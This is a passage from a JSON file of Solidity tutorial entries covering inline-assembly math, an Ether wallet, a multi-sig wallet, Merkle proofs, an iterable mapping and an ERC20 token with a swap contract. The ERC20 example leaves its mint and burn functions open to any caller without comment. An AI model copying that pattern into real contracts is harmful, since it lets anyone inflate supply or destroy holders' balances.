        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract AssemblyMath {\n    function yul_add(uint256 x, uint256 y) public pure returns (uint256 z) {\n        assembly {\n            z := add(x, y)\n            if lt(z, x) { revert(0, 0) }\n        }\n    }\n\n    function yul_mul(uint256 x, uint256 y) public pure returns (uint256 z) {\n        assembly {\n            switch x\n            case 0 { z := 0 }\n            default {\n                z := mul(x, y)\n                if iszero(eq(div(z, x), y)) { revert(0, 0) }\n            }\n        }\n    }\n\n    // Round to nearest multiple of b\n    function yul_fixed_point_round(uint256 x, uint256 b)\n        public\n        pure\n        returns (uint256 z)\n    {\n        assembly {\n            // b = 100\n            // x = 90\n            // z = 90 / 100 * 100 = 0, want z = 100\n            // z := mul(div(x, b), b)\n\n            let half := div(b, 2)\n            z := add(x, half)\n            z := mul(div(z, b), b)\n            // x = 90\n            // half = 50\n            // z = 90 + 50 = 140\n            // z = 140 / 100 * 100 = 100\n        }\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "assembly",
      "yul",
      "math",
      "add",
      "mul"
    ],
    "order": 52
  },
  {
    "slug": "ether-wallet",
    "title": "Ether Wallet",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Simple example of wallet in Solidity",
    "content": "An example of a basic wallet.\n\n- Anyone can send ETH.\n- Only the owner can withdraw.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract EtherWallet {\n    address payable public owner;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    receive() external payable {}\n\n    function withdraw(uint256 _amount) external {\n        require(msg.sender == owner, \"caller is not owner\");\n        payable(msg.sender).transfer(_amount);\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "EtherWallet.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract EtherWallet {\n    address payable public owner;\n\n    constructor() {\n        owner = payable(msg.sender);\n    }\n\n    receive() external payable {}\n\n    function withdraw(uint256 _amount) external {\n        require(msg.sender == owner, \"caller is not owner\");\n        payable(msg.sender).transfer(_amount);\n    }\n\n    function getBalance() external view returns (uint256) {\n        return address(this).balance;\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "ether",
      "eth",
      "wallet"
    ],
    "order": 0
  },
  {
    "slug": "multi-sig-wallet",
    "title": "Multi-Sig Wallet",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "An example of multi-sig wallet in Solidity",
    "content": "Let's create a multi-sig wallet. Here are the specifications.\n\nThe wallet owners can\n\n- submit a transaction\n- approve and revoke approval of pending transactions\n- anyone can execute a transaction after enough owners have approved it.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MultiSigWallet {\n    event Deposit(address indexed sender, uint256 amount, uint256 balance);\n    event SubmitTransaction(\n        address indexed owner,\n        uint256 indexed txIndex,\n        address indexed to,\n        uint256 value,\n        bytes data\n    );\n    event ConfirmTransaction(address indexed owner, uint256 indexed txIndex);\n    event RevokeConfirmation(address indexed owner, uint256 indexed txIndex);\n    event ExecuteTransaction(address indexed owner, uint256 indexed txIndex);\n\n    address[] public owners;\n    mapping(address => bool) public isOwner;\n    uint256 public numConfirmationsRequired;\n\n    struct Transaction {\n        address to;\n        uint256 value;\n        bytes data;\n        bool executed;\n        uint256 numConfirmations;\n    }\n\n    // mapping from tx index => owner => bool\n    mapping(uint256 => mapping(address => bool)) public isConfirmed;\n\n    Transaction[] public transactions;\n\n    modifier onlyOwner() {\n        require(isOwner[msg.sender], \"not owner\");\n        _;\n    }\n\n    modifier txExists(uint256 _txIndex) {\n        require(_txIndex < transactions.length, \"tx does not exist\");\n        _;\n    }\n\n    modifier notExecuted(uint256 _txIndex) {\n        require(!transactions[_txIndex].executed, \"tx already executed\");\n        _;\n    }\n\n    modifier notConfirmed(uint256 _txIndex) {\n        require(!isConfirmed[_txIndex][msg.sender], \"tx already confirmed\");\n        _;\n    }\n\n    constructor(address[] memory _owners, uint256 _numConfirmationsRequired) {\n        require(_owners.length > 0, \"owners required\");\n        require(\n            _numConfirmationsRequired > 0\n                && _numConfirmationsRequired <= _owners.length,\n            \"invalid number of required confirmations\"\n        );\n\n        for (uint256 i = 0; i < _owners.length; i++) {\n            address owner = _owners[i];\n\n            require(owner != address(0), \"invalid owner\");\n            require(!isOwner[owner], \"owner not unique\");\n\n            isOwner[owner] = true;\n            owners.push(owner);\n        }\n\n        numConfirmationsRequired = _numConfirmationsRequired;\n    }\n\n    receive() external payable {\n        emit Deposit(msg.sender, msg.value, address(this).balance);\n    }\n\n    function submitTransaction(address _to, uint256 _value, bytes memory _data)\n        public\n        onlyOwner\n    {\n        uint256 txIndex = transactions.length;\n\n        transactions.push(\n            Transaction({\n                to: _to,\n                value: _value,\n                data: _data,\n                executed: false,\n                numConfirmations: 0\n            })\n        );\n\n        emit SubmitTransaction(msg.sender, txIndex, _to, _value, _data);\n    }\n\n    function confirmTransaction(uint256 _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n        notConfirmed(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n        transaction.numConfirmations += 1;\n        isConfirmed[_txIndex][msg.sender] = true;\n\n        emit ConfirmTransaction(msg.sender, _txIndex);\n    }\n\n    function executeTransaction(uint256 _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        require(\n            transaction.numConfirmations >= numConfirmationsRequired,\n            \"cannot execute tx\"\n        );\n\n        transaction.executed = true;\n\n        (bool success,) =\n            transaction.to.call{value: transaction.value}(transaction.data);\n        require(success, \"tx failed\");\n\n        emit ExecuteTransaction(msg.sender, _txIndex);\n    }\n\n    function revokeConfirmation(uint256 _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        require(isConfirmed[_txIndex][msg.sender], \"tx not confirmed\");\n\n        transaction.numConfirmations -= 1;\n        isConfirmed[_txIndex][msg.sender] = false;\n\n        emit RevokeConfirmation(msg.sender, _txIndex);\n    }\n\n    function getOwners() public view returns (address[] memory) {\n        return owners;\n    }\n\n    function getTransactionCount() public view returns (uint256) {\n        return transactions.length;\n    }\n\n    function getTransaction(uint256 _txIndex)\n        public\n        view\n        returns (\n            address to,\n            uint256 value,\n            bytes memory data,\n            bool executed,\n            uint256 numConfirmations\n        )\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        return (\n            transaction.to,\n            transaction.value,\n            transaction.data,\n            transaction.executed,\n            transaction.numConfirmations\n        );\n    }\n}\n\n```\n\nHere is a contract to test sending transactions from the multi-sig wallet\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract TestContract {\n    uint256 public i;\n\n    function callMe(uint256 j) public {\n        i += j;\n    }\n\n    function getData() public pure returns (bytes memory) {\n        return abi.encodeWithSignature(\"callMe(uint256)\", 123);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "MultiSigWallet.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MultiSigWallet {\n    event Deposit(address indexed sender, uint256 amount, uint256 balance);\n    event SubmitTransaction(\n        address indexed owner,\n        uint256 indexed txIndex,\n        address indexed to,\n        uint256 value,\n        bytes data\n    );\n    event ConfirmTransaction(address indexed owner, uint256 indexed txIndex);\n    event RevokeConfirmation(address indexed owner, uint256 indexed txIndex);\n    event ExecuteTransaction(address indexed owner, uint256 indexed txIndex);\n\n    address[] public owners;\n    mapping(address => bool) public isOwner;\n    uint256 public numConfirmationsRequired;\n\n    struct Transaction {\n        address to;\n        uint256 value;\n        bytes data;\n        bool executed;\n        uint256 numConfirmations;\n    }\n\n    // mapping from tx index => owner => bool\n    mapping(uint256 => mapping(address => bool)) public isConfirmed;\n\n    Transaction[] public transactions;\n\n    modifier onlyOwner() {\n        require(isOwner[msg.sender], \"not owner\");\n        _;\n    }\n\n    modifier txExists(uint256 _txIndex) {\n        require(_txIndex < transactions.length, \"tx does not exist\");\n        _;\n    }\n\n    modifier notExecuted(uint256 _txIndex) {\n        require(!transactions[_txIndex].executed, \"tx already executed\");\n        _;\n    }\n\n    modifier notConfirmed(uint256 _txIndex) {\n        require(!isConfirmed[_txIndex][msg.sender], \"tx already confirmed\");\n        _;\n    }\n\n    constructor(address[] memory _owners, uint256 _numConfirmationsRequired) {\n        require(_owners.length > 0, \"owners required\");\n        require(\n            _numConfirmationsRequired > 0\n                && _numConfirmationsRequired <= _owners.length,\n            \"invalid number of required confirmations\"\n        );\n\n        for (uint256 i = 0; i < _owners.length; i++) {\n            address owner = _owners[i];\n\n            require(owner != address(0), \"invalid owner\");\n            require(!isOwner[owner], \"owner not unique\");\n\n            isOwner[owner] = true;\n            owners.push(owner);\n        }\n\n        numConfirmationsRequired = _numConfirmationsRequired;\n    }\n\n    receive() external payable {\n        emit Deposit(msg.sender, msg.value, address(this).balance);\n    }\n\n    function submitTransaction(address _to, uint256 _value, bytes memory _data)\n        public\n        onlyOwner\n    {\n        uint256 txIndex = transactions.length;\n\n        transactions.push(\n            Transaction({\n                to: _to,\n                value: _value,\n                data: _data,\n                executed: false,\n                numConfirmations: 0\n            })\n        );\n\n        emit SubmitTransaction(msg.sender, txIndex, _to, _value, _data);\n    }\n\n    function confirmTransaction(uint256 _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n        notConfirmed(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n        transaction.numConfirmations += 1;\n        isConfirmed[_txIndex][msg.sender] = true;\n\n        emit ConfirmTransaction(msg.sender, _txIndex);\n    }\n\n    function executeTransaction(uint256 _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        require(\n            transaction.numConfirmations >= numConfirmationsRequired,\n            \"cannot execute tx\"\n        );\n\n        transaction.executed = true;\n\n        (bool success,) =\n            transaction.to.call{value: transaction.value}(transaction.data);\n        require(success, \"tx failed\");\n\n        emit ExecuteTransaction(msg.sender, _txIndex);\n    }\n\n    function revokeConfirmation(uint256 _txIndex)\n        public\n        onlyOwner\n        txExists(_txIndex)\n        notExecuted(_txIndex)\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        require(isConfirmed[_txIndex][msg.sender], \"tx not confirmed\");\n\n        transaction.numConfirmations -= 1;\n        isConfirmed[_txIndex][msg.sender] = false;\n\n        emit RevokeConfirmation(msg.sender, _txIndex);\n    }\n\n    function getOwners() public view returns (address[] memory) {\n        return owners;\n    }\n\n    function getTransactionCount() public view returns (uint256) {\n        return transactions.length;\n    }\n\n    function getTransaction(uint256 _txIndex)\n        public\n        view\n        returns (\n            address to,\n            uint256 value,\n            bytes memory data,\n            bool executed,\n            uint256 numConfirmations\n        )\n    {\n        Transaction storage transaction = transactions[_txIndex];\n\n        return (\n            transaction.to,\n            transaction.value,\n            transaction.data,\n            transaction.executed,\n            transaction.numConfirmations\n        );\n    }\n}\n"
      },
      {
        "fileName": "TestContract.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract TestContract {\n    uint256 public i;\n\n    function callMe(uint256 j) public {\n        i += j;\n    }\n\n    function getData() public pure returns (bytes memory) {\n        return abi.encodeWithSignature(\"callMe(uint256)\", 123);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "multi",
      "sig",
      "signature",
      "wallet"
    ],
    "order": 1
  },
  {
    "slug": "merkle-tree",
    "title": "Merkle Tree",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Learn about Merkle tree in Solidity",
    "content": "Merkle tree allows you to cryptographically prove that an element is contained\n\nin a set without revealing the entire set.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MerkleProof {\n    function verify(\n        bytes32[] memory proof,\n        bytes32 root,\n        bytes32 leaf,\n        uint256 index\n    ) public pure returns (bool) {\n        bytes32 hash = leaf;\n\n        for (uint256 i = 0; i < proof.length; i++) {\n            bytes32 proofElement = proof[i];\n\n            if (index % 2 == 0) {\n                hash = keccak256(abi.encodePacked(hash, proofElement));\n            } else {\n                hash = keccak256(abi.encodePacked(proofElement, hash));\n            }\n\n            index = index / 2;\n        }\n\n        return hash == root;\n    }\n}\n\ncontract TestMerkleProof is MerkleProof {\n    bytes32[] public hashes;\n\n    constructor() {\n        string[4] memory transactions =\n            [\"alice -> bob\", \"bob -> dave\", \"carol -> alice\", \"dave -> bob\"];\n\n        for (uint256 i = 0; i < transactions.length; i++) {\n            hashes.push(keccak256(abi.encodePacked(transactions[i])));\n        }\n\n        uint256 n = transactions.length;\n        uint256 offset = 0;\n\n        while (n > 0) {\n            for (uint256 i = 0; i < n - 1; i += 2) {\n                hashes.push(\n                    keccak256(\n                        abi.encodePacked(\n                            hashes[offset + i], hashes[offset + i + 1]\n                        )\n                    )\n                );\n            }\n            offset += n;\n            n = n / 2;\n        }\n    }\n\n    function getRoot() public view returns (bytes32) {\n        return hashes[hashes.length - 1];\n    }\n\n    /* verify\n    3rd leaf\n    0xdca3326ad7e8121bf9cf9c12333e6b2271abe823ec9edfe42f813b1e768fa57b\n\n    root\n    0xcc086fcc038189b4641db2cc4f1de3bb132aefbd65d510d817591550937818c7\n\n    index\n    2\n\n    proof\n    0x8da9e1c820f9dbd1589fd6585872bc1063588625729e7ab0797cfc63a00bd950\n    0x995788ffc103b987ad50f5e5707fd094419eb12d9552cc423bd0cd86a3861433\n    */\n}\n\n```",
    "codes": [
      {
        "fileName": "MerkleTree.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ncontract MerkleProof {\n    function verify(\n        bytes32[] memory proof,\n        bytes32 root,\n        bytes32 leaf,\n        uint256 index\n    ) public pure returns (bool) {\n        bytes32 hash = leaf;\n\n        for (uint256 i = 0; i < proof.length; i++) {\n            bytes32 proofElement = proof[i];\n\n            if (index % 2 == 0) {\n                hash = keccak256(abi.encodePacked(hash, proofElement));\n            } else {\n                hash = keccak256(abi.encodePacked(proofElement, hash));\n            }\n\n            index = index / 2;\n        }\n\n        return hash == root;\n    }\n}\n\ncontract TestMerkleProof is MerkleProof {\n    bytes32[] public hashes;\n\n    constructor() {\n        string[4] memory transactions =\n            [\"alice -> bob\", \"bob -> dave\", \"carol -> alice\", \"dave -> bob\"];\n\n        for (uint256 i = 0; i < transactions.length; i++) {\n            hashes.push(keccak256(abi.encodePacked(transactions[i])));\n        }\n\n        uint256 n = transactions.length;\n        uint256 offset = 0;\n\n        while (n > 0) {\n            for (uint256 i = 0; i < n - 1; i += 2) {\n                hashes.push(\n                    keccak256(\n                        abi.encodePacked(\n                            hashes[offset + i], hashes[offset + i + 1]\n                        )\n                    )\n                );\n            }\n            offset += n;\n            n = n / 2;\n        }\n    }\n\n    function getRoot() public view returns (bytes32) {\n        return hashes[hashes.length - 1];\n    }\n\n    /* verify\n    3rd leaf\n    0xdca3326ad7e8121bf9cf9c12333e6b2271abe823ec9edfe42f813b1e768fa57b\n\n    root\n    0xcc086fcc038189b4641db2cc4f1de3bb132aefbd65d510d817591550937818c7\n\n    index\n    2\n\n    proof\n    0x8da9e1c820f9dbd1589fd6585872bc1063588625729e7ab0797cfc63a00bd950\n    0x995788ffc103b987ad50f5e5707fd094419eb12d9552cc423bd0cd86a3861433\n    */\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "merkle",
      "tree",
      "cryptography"
    ],
    "order": 2
  },
  {
    "slug": "iterable-mapping",
    "title": "Iterable Mapping",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Iterable Mapping in Solidity",
    "content": "You cannot iterate through a `mapping`. So here is an example of how to create an iterable `mapping`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nlibrary IterableMapping {\n    // Iterable mapping from address to uint;\n    struct Map {\n        address[] keys;\n        mapping(address => uint256) values;\n        mapping(address => uint256) indexOf;\n        mapping(address => bool) inserted;\n    }\n\n    function get(Map storage map, address key) public view returns (uint256) {\n        return map.values[key];\n    }\n\n    function getKeyAtIndex(Map storage map, uint256 index)\n        public\n        view\n        returns (address)\n    {\n        return map.keys[index];\n    }\n\n    function size(Map storage map) public view returns (uint256) {\n        return map.keys.length;\n    }\n\n    function set(Map storage map, address key, uint256 val) public {\n        if (map.inserted[key]) {\n            map.values[key] = val;\n        } else {\n            map.inserted[key] = true;\n            map.values[key] = val;\n            map.indexOf[key] = map.keys.length;\n            map.keys.push(key);\n        }\n    }\n\n    function remove(Map storage map, address key) public {\n        if (!map.inserted[key]) {\n            return;\n        }\n\n        delete map.inserted[key];\n        delete map.values[key];\n\n        uint256 index = map.indexOf[key];\n        address lastKey = map.keys[map.keys.length - 1];\n\n        map.indexOf[lastKey] = index;\n        delete map.indexOf[key];\n\n        map.keys[index] = lastKey;\n        map.keys.pop();\n    }\n}\n\ncontract TestIterableMap {\n    using IterableMapping for IterableMapping.Map;\n\n    IterableMapping.Map private map;\n\n    function setInMapping(uint256 val) public {\n        map.set(msg.sender, val);\n    }\n\n    function getFromMap() public view returns (uint256) {\n        return map.get(msg.sender);\n    }\n\n    function getKeyAtIndex(uint256 index) public view returns (address) {\n        return map.getKeyAtIndex(index);\n    }\n\n    function sizeOfMapping() public view returns (uint256) {\n        return map.size();\n    }\n\n    function removeFromMapping() public {\n        map.remove(msg.sender);\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "IterableMapping.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nlibrary IterableMapping {\n    // Iterable mapping from address to uint;\n    struct Map {\n        address[] keys;\n        mapping(address => uint256) values;\n        mapping(address => uint256) indexOf;\n        mapping(address => bool) inserted;\n    }\n\n    function get(Map storage map, address key) public view returns (uint256) {\n        return map.values[key];\n    }\n\n    function getKeyAtIndex(Map storage map, uint256 index)\n        public\n        view\n        returns (address)\n    {\n        return map.keys[index];\n    }\n\n    function size(Map storage map) public view returns (uint256) {\n        return map.keys.length;\n    }\n\n    function set(Map storage map, address key, uint256 val) public {\n        if (map.inserted[key]) {\n            map.values[key] = val;\n        } else {\n            map.inserted[key] = true;\n            map.values[key] = val;\n            map.indexOf[key] = map.keys.length;\n            map.keys.push(key);\n        }\n    }\n\n    function remove(Map storage map, address key) public {\n        if (!map.inserted[key]) {\n            return;\n        }\n\n        delete map.inserted[key];\n        delete map.values[key];\n\n        uint256 index = map.indexOf[key];\n        address lastKey = map.keys[map.keys.length - 1];\n\n        map.indexOf[lastKey] = index;\n        delete map.indexOf[key];\n\n        map.keys[index] = lastKey;\n        map.keys.pop();\n    }\n}\n\ncontract TestIterableMap {\n    using IterableMapping for IterableMapping.Map;\n\n    IterableMapping.Map private map;\n\n    function setInMapping(uint256 val) public {\n        map.set(msg.sender, val);\n    }\n\n    function getFromMap() public view returns (uint256) {\n        return map.get(msg.sender);\n    }\n\n    function getKeyAtIndex(uint256 index) public view returns (address) {\n        return map.getKeyAtIndex(index);\n    }\n\n    function sizeOfMapping() public view returns (uint256) {\n        return map.size();\n    }\n\n    function removeFromMapping() public {\n        map.remove(msg.sender);\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "mapping",
      "data",
      "iterable"
    ],
    "order": 3
  },
  {
    "slug": "erc20",
    "title": "ERC20",
    "category": "Applications",
    "categorySlug": "applications",
    "description": "Example of ERC20 token in Solidity",
    "content": "Any contract that follow the <a href=\"https://eips.ethereum.org/EIPS/eip-20\" target=\"__blank\">ERC20 standard</a> is a ERC20 token.\n\nERC20 tokens provide functionalities to\n\n- transfer tokens\n- allow others to transfer tokens on behalf of the token holder\n\nHere is the interface for ERC20.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n\n```\n\nExample of `ERC20` token contract.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./IERC20.sol\";\n\ncontract ERC20 is IERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 value\n    );\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n    }\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool)\n    {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool)\n    {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function _mint(address to, uint256 amount) internal {\n        balanceOf[to] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal {\n        balanceOf[from] -= amount;\n        totalSupply -= amount;\n        emit Transfer(from, address(0), amount);\n    }\n\n    function mint(address to, uint256 amount) external {\n        _mint(to, amount);\n    }\n\n    function burn(address from, uint256 amount) external {\n        _burn(from, amount);\n    }\n}\n\n```\n\n## Create your own ERC20 token\n\nUsing <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts\" target=\"__blank\">Open Zeppelin</a> it's really easy to create your own ERC20 token.\n\nHere is an example\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ERC20.sol\";\n\ncontract MyToken is ERC20 {\n    constructor(string memory name, string memory symbol, uint8 decimals)\n        ERC20(name, symbol, decimals)\n    {\n        // Mint 100 tokens to msg.sender\n        // Similar to how\n        // 1 dollar = 100 cents\n        // 1 token = 1 * (10 ** decimals)\n        _mint(msg.sender, 100 * 10 ** uint256(decimals));\n    }\n}\n\n```\n\n## Contract to swap tokens\n\nHere is an example contract, `TokenSwap`, to trade one ERC20 token for another.\n\nThis contract will swap tokens by calling\n\n```solidity\ntransferFrom(address sender, address recipient, uint256 amount)\n\n```\n\nwhich will transfer `amount` of token from `sender` to `recipient`.\n\nFor `transferFrom` to succeed, `sender` must\n\n- have more than `amount` tokens in their balance\n- allowed `TokenSwap` to withdraw `amount` tokens by calling `approve`\n\nprior to `TokenSwap` calling `transferFrom`\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./IERC20.sol\";\n\n/*\nHow to swap tokens\n\n1. Alice has 100 tokens from AliceCoin, which is a ERC20 token.\n2. Bob has 100 tokens from BobCoin, which is also a ERC20 token.\n3. Alice and Bob wants to trade 10 AliceCoin for 20 BobCoin.\n4. Alice or Bob deploys TokenSwap\n5. Alice approves TokenSwap to withdraw 10 tokens from AliceCoin\n6. Bob approves TokenSwap to withdraw 20 tokens from BobCoin\n7. Alice or Bob calls TokenSwap.swap()\n8. Alice and Bob traded tokens successfully.\n*/\n\ncontract TokenSwap {\n    IERC20 public token1;\n    address public owner1;\n    uint256 public amount1;\n    IERC20 public token2;\n    address public owner2;\n    uint256 public amount2;\n\n    constructor(\n        address _token1,\n        address _owner1,\n        uint256 _amount1,\n        address _token2,\n        address _owner2,\n        uint256 _amount2\n    ) {\n        token1 = IERC20(_token1);\n        owner1 = _owner1;\n        amount1 = _amount1;\n        token2 = IERC20(_token2);\n        owner2 = _owner2;\n        amount2 = _amount2;\n    }\n\n    function swap() public {\n        require(msg.sender == owner1 || msg.sender == owner2, \"Not authorized\");\n        require(\n            token1.allowance(owner1, address(this)) >= amount1,\n            \"Token 1 allowance too low\"\n        );\n        require(\n            token2.allowance(owner2, address(this)) >= amount2,\n            \"Token 2 allowance too low\"\n        );\n\n        _safeTransferFrom(token1, owner1, owner2, amount1);\n        _safeTransferFrom(token2, owner2, owner1, amount2);\n    }\n\n    function _safeTransferFrom(\n        IERC20 token,\n        address sender,\n        address recipient,\n        uint256 amount\n    ) private {\n        bool sent = token.transferFrom(sender, recipient, amount);\n        require(sent, \"Token transfer failed\");\n    }\n}\n\n```",
    "codes": [
      {
        "fileName": "ERC20.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./IERC20.sol\";\n\ncontract ERC20 is IERC20 {\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner, address indexed spender, uint256 value\n    );\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    string public name;\n    string public symbol;\n    uint8 public decimals;\n\n    constructor(string memory _name, string memory _symbol, uint8 _decimals) {\n        name = _name;\n        symbol = _symbol;\n        decimals = _decimals;\n    }\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool)\n    {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool)\n    {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function _mint(address to, uint256 amount) internal {\n        balanceOf[to] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), to, amount);\n    }\n\n    function _burn(address from, uint256 amount) internal {\n        balanceOf[from] -= amount;\n        totalSupply -= amount;\n        emit Transfer(from, address(0), amount);\n    }\n\n    function mint(address to, uint256 amount) external {\n        _mint(to, amount);\n    }\n\n    function burn(address from, uint256 amount) external {\n        _burn(from, amount);\n    }\n}\n"
      },
      {
        "fileName": "IERC20.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\ninterface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n    function allowance(address owner, address spender)\n        external\n        view\n        returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount)\n        external\n        returns (bool);\n}\n"
      },
      {
        "fileName": "MyToken.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./ERC20.sol\";\n\ncontract MyToken is ERC20 {\n    constructor(string memory name, string memory symbol, uint8 decimals)\n        ERC20(name, symbol, decimals)\n    {\n        // Mint 100 tokens to msg.sender\n        // Similar to how\n        // 1 dollar = 100 cents\n        // 1 token = 1 * (10 ** decimals)\n        _mint(msg.sender, 100 * 10 ** uint256(decimals));\n    }\n}\n"
      },
      {
        "fileName": "TokenSwap.sol",
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.26;\n\nimport \"./IERC20.sol\";\n\n/*\nHow to swap tokens\n\n1. Alice has 100 tokens from AliceCoin, which is a ERC20 token.\n2. Bob has 100 tokens from BobCoin, which is also a ERC20 token.\n3. Alice and Bob wants to trade 10 AliceCoin for 20 BobCoin.\n4. Alice or Bob deploys TokenSwap\n5. Alice approves TokenSwap to withdraw 10 tokens from AliceCoin\n6. Bob approves TokenSwap to withdraw 20 tokens from BobCoin\n7. Alice or Bob calls TokenSwap.swap()\n8. Alice and Bob traded tokens successfully.\n*/\n\ncontract TokenSwap {\n    IERC20 public token1;\n    address public owner1;\n    uint256 public amount1;\n    IERC20 public token2;\n    address public owner2;\n    uint256 public amount2;\n\n    constructor(\n        address _token1,\n        address _owner1,\n        uint256 _amount1,\n        address _token2,\n        address _owner2,\n        uint256 _amount2\n    ) {\n        token1 = IERC20(_token1);\n        owner1 = _owner1;\n        amount1 = _amount1;\n        token2 = IERC20(_token2);\n        owner2 = _owner2;\n        amount2 = _amount2;\n    }\n\n    function swap() public {\n        require(msg.sender == owner1 || msg.sender == owner2, \"Not authorized\");\n        require(\n            token1.allowance(owner1, address(this)) >= amount1,\n            \"Token 1 allowance too low\"\n        );\n        require(\n            token2.allowance(owner2, address(this)) >= amount2,\n            \"Token 2 allowance too low\"\n        );\n\n        _safeTransferFrom(token1, owner1, owner2, amount1);\n        _safeTransferFrom(token2, owner2, owner1, amount2);\n    }\n\n    function _safeTransferFrom(\n        IERC20 token,\n        address sender,\n        address recipient,\n        uint256 amount\n    ) private {\n        bool sent = token.transferFrom(sender, recipient, amount);\n        require(sent, \"Token transfer failed\");\n    }\n}\n"
      }
    ],
    "version": "0.8.26",
    "keywords": [
      "app",
      "application",
      "erc20",
      "ierc20",
      "token"
    ],
    "order": 4
  },
  {
